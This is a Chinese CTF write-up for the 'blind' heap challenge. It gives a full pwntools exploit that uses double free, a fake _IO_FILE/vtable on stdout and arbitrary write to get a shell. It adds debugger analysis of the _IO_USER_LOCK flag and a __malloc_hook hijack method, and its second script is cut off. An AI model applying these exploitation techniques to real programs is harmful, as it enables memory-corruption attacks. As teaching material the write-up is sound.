+<h2 id="利用代码"><a href="#利用代码" class="headerlink" title="利用代码"></a>利用代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, endian=<span class="string">'little'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./blind'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./blind'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(idx,content)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line">	p.recvuntil(<span class="string">'Done!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content,flag=<span class="number">0</span>)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">2</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line">	<span class="keyword">if</span> flag==<span class="number">0</span>:</span><br><span class="line">		p.recvuntil(<span class="string">'Done!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">release</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">3</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'Done!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(where,to,flag=<span class="number">0</span>)</span>:</span></span><br><span class="line">	change(<span class="number">5</span>,<span class="string">'\x00'</span>*<span class="number">0x13</span>+p64(where),flag)</span><br><span class="line">	change(<span class="number">0</span>,to,flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">10</span>) <span class="comment">#chunk 0</span></span><br><span class="line">new(<span class="number">1</span>,<span class="string">'b'</span>*<span class="number">10</span>) <span class="comment">#chunk 1</span></span><br><span class="line"><span class="comment"># new(2,'c'*10) #2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里采用的是double free的方式来往bss分配数据，其实可以直接在free一个chunk后修改其中的fd指针来实现同样的功能</span></span><br><span class="line"><span class="comment"># 这里用double free显得复杂化了</span></span><br><span class="line">release(<span class="number">0</span>)</span><br><span class="line">release(<span class="number">1</span>)</span><br><span class="line">release(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">10</span>) <span class="comment">#chunk 0</span></span><br><span class="line">new(<span class="number">3</span>,<span class="string">'b'</span>*<span class="number">10</span>) <span class="comment">#chunk 1</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0x60203d</span>)</span><br><span class="line">change(<span class="number">2</span>,payload)</span><br><span class="line">new(<span class="number">4</span>,<span class="string">'c'</span>*<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">5</span>,<span class="string">'\x00'</span>)</span><br><span class="line"><span class="comment"># 把虚假的FILE结构体伪造在0x602100处</span></span><br><span class="line"><span class="comment"># 相对于FILE偏移为0xd8处为指向函数表的指针</span></span><br><span class="line"><span class="comment"># 该指针指向0x602200，也即伪造的函数表</span></span><br><span class="line">payload = p64(<span class="number">0xfbada887</span>)+p64(<span class="number">0x0</span>)*<span class="number">7</span>+p64(<span class="number">1</span>)</span><br><span class="line">write(<span class="number">0x602100</span>,payload)</span><br><span class="line">payload = p64(<span class="number">0x602200</span>)</span><br><span class="line">write(<span class="number">0x6021d8</span>,payload)</span><br><span class="line">payload = p64(<span class="number">0x4008e3</span>)*<span class="number">8</span></span><br><span class="line">write(<span class="number">0x602200</span>,payload)</span><br><span class="line"><span class="comment"># gdb.attach(p,gdbscript='''</span></span><br><span class="line"><span class="comment"># b *0x400c6e</span></span><br><span class="line"><span class="comment"># 	''')</span></span><br><span class="line"><span class="comment"># raw_input('sss')</span></span><br><span class="line">write(<span class="number">0x602020</span>,p64(<span class="number">0x602100</span>),<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h2 id="关于-IO-FILE的问题"><a href="#关于-IO-FILE的问题" class="headerlink" title="关于_IO_FILE的问题"></a>关于_IO_FILE的问题</h2><p>这里将FILE结构体伪造在了0x602100处，0x602100处对应的值为FILE结构体里面的flag，这个标识的值怎么来的？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /10xg 0x00007f17450cb620</span><br><span class="line">0x7f17450cb620 &lt;_IO_2_1_stdout_&gt;:	0x00000000fbad2887	0x00007f17450cb6a3</span><br><span class="line">0x7f17450cb630 &lt;_IO_2_1_stdout_+16&gt;:	0x00007f17450cb6a3	0x00007f17450cb6a3</span><br><span class="line">0x7f17450cb640 &lt;_IO_2_1_stdout_+32&gt;:	0x00007f17450cb6a3	0x00007f17450cb6a3</span><br><span class="line">0x7f17450cb650 &lt;_IO_2_1_stdout_+48&gt;:	0x00007f17450cb6a3	0x00007f17450cb6a3</span><br></pre></td></tr></table></figure></p>
+<p>查看stdout结构体原始的flag值为<code>0xfbad2887</code>，但是在虚假FILE结构体里将flag设置为这个值总是会出错。而将其设置为writeup里面的值<code>0xfbada887</code>就没有问题。所以在利用IO_FILE控制程序流程时flag的值应该怎么选择呢？</p>
+<p>先比较这两个<code>_flags</code>值（由于<code>_flags</code>值的高2字节为magic，不用管）：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x2887--&gt;0010 1000 10000111</span><br><span class="line">0xA887--&gt;1010 1000 10000111</span><br></pre></td></tr></table></figure></p>
+<p>可以发现在第二字节的最高位处该值为0x1，flag的值表示的是状态信息，都是通过与某个#define好的值进行与、或操作，这里对应的值应为0x8000，全局搜索glibc源码，找到该值对应的变量为<code>_IO_USER_LOCK</code>。</p>
+<p>在网上搜索该变量相关的信息，找到了下面的文章：<br><a href="https://veritas501.space/2017/12/13/IO%20FILE%20%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" target="_blank" rel="noopener">参考链接</a></p>
+<p>我们劫持的是stdout结构体，在劫持后程序立马调用了函数puts：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1 &lt;= <span class="number">5</span> &amp;&amp; *(&amp;ptr + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1) )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Content:"</span>, &amp;s);</span><br><span class="line">  get_input((__int64)*(&amp;ptr + (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v1), <span class="number">0x68</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Done!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>puts函数的调用栈回溯：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">vfprintf+11</span><br><span class="line">_IO_file_xsputn</span><br><span class="line">_IO_file_overflow</span><br><span class="line">funlockfile</span><br><span class="line">_IO_file_write</span><br><span class="line">write</span><br></pre></td></tr></table></figure></p>
+<p>puts函数源码中通过<code>_IO_puts</code>函数实现：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">int</span><br><span class="line">_IO_puts (const char *str)</span><br><span class="line">&#123;</span><br><span class="line">  int result = EOF;</span><br><span class="line">  _IO_size_t len = strlen (str);</span><br><span class="line">  _IO_acquire_lock (_IO_stdout);</span><br><span class="line"></span><br><span class="line">  if ((_IO_vtable_offset (_IO_stdout) != 0</span><br><span class="line">       || _IO_fwide (_IO_stdout, -1) == -1)</span><br><span class="line">      &amp;&amp; _IO_sputn (_IO_stdout, str, len) == len</span><br><span class="line">      &amp;&amp; _IO_putc_unlocked (&apos;\n&apos;, _IO_stdout) != EOF)</span><br><span class="line">    result = MIN (INT_MAX, len + 1);</span><br><span class="line"></span><br><span class="line">  _IO_release_lock (_IO_stdout);</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>函数开始时调用了<code>_IO_acquire_lock</code>函数，问题就出现在这里，跟进该函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># <span class="meta-keyword">define</span> _IO_acquire_lock(_fp) \</span></span><br><span class="line">  <span class="keyword">do</span> &#123;									      \</span><br><span class="line">    _IO_FILE *_IO_acquire_lock_file					      \</span><br><span class="line">	__attribute__((cleanup (_IO_acquire_lock_fct)))			      \</span><br><span class="line">	= (_fp);							      \</span><br><span class="line">    _IO_flockfile (_IO_acquire_lock_file);</span><br></pre></td></tr></table></figure></p>
+<p>其中又调用了<code>_IO_acquire_lock_fct</code>函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span><br><span class="line">__attribute__ ((__always_inline__))</span><br><span class="line">_IO_acquire_lock_fct (_IO_FILE **p)</span><br><span class="line">&#123;</span><br><span class="line">  _IO_FILE *fp = *p;</span><br><span class="line">  <span class="keyword">if</span> ((fp-&gt;_flags &amp; _IO_USER_LOCK) == <span class="number">0</span>)</span><br><span class="line">    _IO_funlockfile (fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>该函数中对标志位<code>_IO_USER_LOCK</code>进行了检查，不能让<code>fp-&gt;_flags &amp; _IO_USER_LOCK</code>的值为0，这里需要bypass。</p>
+<p>在回过头来看这两个<code>_flag</code>值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x2887--&gt;0010 1000 10000111</span><br><span class="line">0xA887--&gt;1010 1000 10000111</span><br></pre></td></tr></table></figure></p>
+<p>发现0x2887正是因为<code>_IO_USER_LOCK</code>为0，导致程序执行了<code>_IO_funlockfile (fp)</code>函数，造成无法正常触发漏洞。</p>
+<h2 id="利用思路——劫持-malloc-hook"><a href="#利用思路——劫持-malloc-hook" class="headerlink" title="利用思路——劫持__malloc_hook"></a>利用思路——劫持__malloc_hook</h2><p>这里的思路是参考的大佬的思路：<a href="http://p4nda.top/2018/08/27/WDBCTF-2018/" target="_blank" rel="noopener">http://p4nda.top/2018/08/27/WDBCTF-2018/</a><br>首先利用任意地址写的能力可以在bss段上伪造chunk的各个字段。这里没有信息泄露，但是又需要劫持程序的流程。通过伪造一个不属于fast bin的chunk，free该chunk会把该chunk放进unsorted bin，这样<code>main arena+88</code>的地址就会出现在bss段上了，通过任意地址写的能力将<code>main arena+88</code>的地址最后一个字节改为0x00，而<code>malloc_hook</code>的地址就在<code>(main arena+88)&amp;(~0xFF)+0x10</code>处，然后就可以修改<code>malloc_hook</code>的值了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /20xg 0x602040</span><br><span class="line">0x602040 &lt;stderr&gt;:	0x00007fa93859c540	0x0000000000000000</span><br><span class="line">0x602050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602060:	0x0000000000b0a010	0x0000000000b0a080</span><br><span class="line">0x602070:	0x0000000000b0a010	0x0000000000b0a080</span><br><span class="line">0x602080:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602090:	0x0000000000000000	0x0000000000000003</span><br><span class="line">0x6020a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure>
+<p>虚假的chunk起始地址需要满足这个条件：<code>__builtin_expect (misaligned_chunk (p), 0)</code>，在调试过程中发现如果将chunk起始地址设置在0x602068处，会产生如下的错误：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received 0x48 bytes:</span><br><span class="line">    &quot;*** Error in `./blind&apos;: free(): invalid pointer: 0x0000000000602078 ***\n&quot;</span><br><span class="line">[DEBUG] Received 0x1d bytes:</span><br><span class="line">    &apos;======= Backtrace: =========\n&apos;</span><br><span class="line">[DEBUG] Received 0x985 bytes:</span><br><span class="line">    &apos;/lib/x86_64-linux-gnu/libc.so.6(+0x777e5)[0x7fabcfaa77e5]\n&apos;</span><br><span class="line">    &apos;/lib/x86_64-linux-gnu/libc.so.6(+0x8037a)[0x7fabcfab037a]\n&apos;</span><br><span class="line">    &apos;/lib/x86_64-linux-gnu/libc.so.6(cfree+0x4c)[0x7fabcfab453c]\n&apos;</span><br><span class="line">    &apos;./blind[0x400bd6]\n&apos;</span><br><span class="line">    &apos;./blind[0x400ca5]\n&apos;</span><br><span class="line">    &apos;/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7fabcfa50830]\n&apos;</span><br><span class="line">    &apos;./blind[0x4007d9]\n&apos;</span><br><span class="line">    &apos;======= Memory map: ========\n&apos;</span><br><span class="line">    &apos;00400000-00401000 r-xp 00000000 08:01 1050380                            /home/ym/Desktop/ctf/wdb/blind/blind\n&apos;</span><br><span class="line">    &apos;00601000-00602000 r--p 00001000 08:01 1050380                            /home/ym/Desktop/ctf/wdb/blind/blind\n&apos;</span><br><span class="line">    &apos;00602000-00603000 rw-p 00002000 08:01 1050380                            /home/ym/Desktop/ctf/wdb/blind/blind\n&apos;</span><br><span class="line">    &apos;0089c000-008bd000 rw-p 00000000 00:00 0                                  [heap]\n&apos;</span><br><span class="line">    &apos;7fabc8000000-7fabc8021000 rw-p 00000000 00:00 0 \n&apos;</span><br><span class="line">    &apos;7fabc8021000-7fabcc000000 ---p 00000000 00:00 0 \n&apos;</span><br><span class="line">    &apos;7fabcf81a000-7fabcf830000 r-xp 00000000 08:01 267917                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n&apos;</span><br><span class="line">    &apos;7fabcf830000-7fabcfa2f000 ---p 00016000 08:01 267917                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n&apos;</span><br><span class="line">    &apos;7fabcfa2f000-7fabcfa30000 rw-p 00015000 08:01 267917                     /lib/x86_64-linux-gnu/libgcc_s.so.1\n&apos;</span><br><span class="line">    &apos;7fabcfa30000-7fabcfbf0000 r-xp 00000000 08:01 311941                     /lib/x86_64-linux-gnu/libc-2.23.so\n&apos;</span><br><span class="line">    &apos;7fabcfbf0000-7fabcfdf0000 ---p 001c0000 08:01 311941                     /lib/x86_64-linux-gnu/libc-2.23.so\n&apos;</span><br><span class="line">    &apos;7fabcfdf0000-7fabcfdf4000 r--p 001c0000 08:01 311941                     /lib/x86_64-linux-gnu/libc-2.23.so\n&apos;</span><br><span class="line">    &apos;7fabcfdf4000-7fabcfdf6000 rw-p 001c4000 08:01 311941                     /lib/x86_64-linux-gnu/libc-2.23.so\n&apos;</span><br><span class="line">    &apos;7fabcfdf6000-7fabcfdfa000 rw-p 00000000 00:00 0 \n&apos;</span><br><span class="line">    &apos;7fabcfdfa000-7fabcfe20000 r-xp 00000000 08:01 311346                     /lib/x86_64-linux-gnu/ld-2.23.so\n&apos;</span><br><span class="line">    &apos;7fabd0002000-7fabd0005000 rw-p 00000000 00:00 0 \n&apos;</span><br><span class="line">    &apos;7fabd001e000-7fabd001f000 rw-p 00000000 00:00 0 \n&apos;</span><br><span class="line">    &apos;7fabd001f000-7fabd0020000 r--p 00025000 08:01 311346                     /lib/x86_64-linux-gnu/ld-2.23.so\n&apos;</span><br><span class="line">    &apos;7fabd0020000-7fabd0021000 rw-p 00026000 08:01 311346                     /lib/x86_64-linux-gnu/ld-2.23.so\n&apos;</span><br><span class="line">    &apos;7fabd0021000-7fabd0022000 rw-p 00000000 00:00 0 \n&apos;</span><br><span class="line">    &apos;7ffeca593000-7ffeca5b4000 rw-p 00000000 00:00 0                          [stack]\n&apos;</span><br><span class="line">    &apos;7ffeca5d2000-7ffeca5d5000 r--p 00000000 00:00 0                          [vvar]\n&apos;</span><br><span class="line">    &apos;7ffeca5d5000-7ffeca5d7000 r-xp 00000000 00:00 0                          [vdso]\n&apos;</span><br><span class="line">    &apos;ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\n&apos;</span><br><span class="line">Traceback (most recent call last):</span><br></pre></td></tr></table></figure></p>
+<p>构造的虚假chunk，将bss段上的数据放到了unsorted bin中，<code>main_arena+88</code>的地址也被放到了bss段上：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /20xg 0x602040</span><br><span class="line">0x602040 &lt;stderr&gt;:	0x00007faaecc34540	0x0000000000000000</span><br><span class="line">0x602050:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x602060:	0x0000000000602068	0x0000000000602060</span><br><span class="line">0x602070:	0x0000000001a93000	0x0000000000000101</span><br><span class="line">0x602080:	0x00007faaecc33b78	0x00007faaecc33b78</span><br><span class="line">0x602090:	0x0000000000000000	0x0000000000000001</span><br><span class="line">0x6020a0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020b0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020c0:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x6020d0:	0x0000000000000000	0x0000000000000000</span><br></pre></td></tr></table></figure></p>
+<p>查看<code>main_arena+88</code>附近的地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x /20xg 0x00007faaecc33b00</span><br><span class="line">0x7faaecc33b00 &lt;__memalign_hook&gt;:	0x00007faaec8f4e20	0x00007faaec8f4a00</span><br><span class="line">//可以看到这里就是malloc_hook的地址,最后一个字节设置为0，且偏移为0x10处</span><br><span class="line">0x7faaecc33b10 &lt;__malloc_hook&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7faaecc33b20 &lt;main_arena&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7faaecc33b30 &lt;main_arena+16&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7faaecc33b40 &lt;main_arena+32&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7faaecc33b50 &lt;main_arena+48&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7faaecc33b60 &lt;main_arena+64&gt;:	0x0000000000000000	0x0000000000000000</span><br><span class="line">0x7faaecc33b70 &lt;main_arena+80&gt;:	0x0000000000000000	0x0000000001a930e0</span><br><span class="line">0x7faaecc33b80 &lt;main_arena+96&gt;:	0x0000000000000000	0x0000000000602070</span><br><span class="line">0x7faaecc33b90 &lt;main_arena+112&gt;:	0x0000000000602070	0x00007faaecc33b88</span><br></pre></td></tr></table></figure></p>
+<h2 id="利用代码-1"><a href="#利用代码-1" class="headerlink" title="利用代码"></a>利用代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">'amd64'</span>, os=<span class="string">'linux'</span>, endian=<span class="string">'little'</span>)</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./blind'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./blind'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(idx,content,flag=<span class="number">0</span>)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">1</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	<span class="keyword">if</span> flag==<span class="number">1</span>:</span><br><span class="line">		p.interactive()</span><br><span class="line">	p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line">	p.recvuntil(<span class="string">'Done!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(idx,content,flag=<span class="number">0</span>)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">2</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'Content:'</span>)</span><br><span class="line">	p.sendline(content)</span><br><span class="line">	<span class="keyword">if</span> flag==<span class="number">0</span>:</span><br><span class="line">		p.recvuntil(<span class="string">'Done!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">release</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">'Choice:'</span>)</span><br><span class="line">	p.sendline(str(<span class="number">3</span>))</span><br><span class="line">	p.recvuntil(<span class="string">'Index:'</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">'Done!'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span><span class="params">(where,to,flag=<span class="number">0</span>)</span>:</span></span><br><span class="line">	change(<span class="number">5</span>,<span class="string">'\x00'</span>*<span class="number">0x13</span>+p64(where),flag)</span><br><span class="line">	change(<span class="number">0</span>,to,flag)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_write</span><span class="params">(where,to,flag=<span class="number">0</span>)</span>:</span></span><br><span class="line">	change(<span class="number">1</span>,p64(where)[:<span class="number">-1</span>],flag)</span><br><span class="line">	change(<span class="number">0</span>,to,flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">new(<span class="number">0</span>,<span class="string">'a'</span>*<span class="number">10</span>) <span class="comment">#chunk 0</span></span><br><span class="line">new(<span class="number">1</span>,<span class="string">'b'</span>*<span class="number">10</span>) <span class="comment">#chunk 1</span></span><br><span class="line"><span class="comment"># new(2,'c'*10) #2</span></span><br><span class="line"></span><br><span class="line">release(<span class="number">0</span>)</span><br><span class="line">release(<span class="number">1</span>)</span><br><span class="line">release(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">new(<span class="number">2</span>,<span class="string">'a'</span>*<span class="number">10</span>) <span class="comment">#chunk 0</span></span><br><span class="line">new(<span class="number">3</span>,<span class="string">'b'</span>*<span class="number">10</span>) <span class="comment">#chunk 1</span></span><br><span class="line"></span><br><span class="line">payload=p64(<span 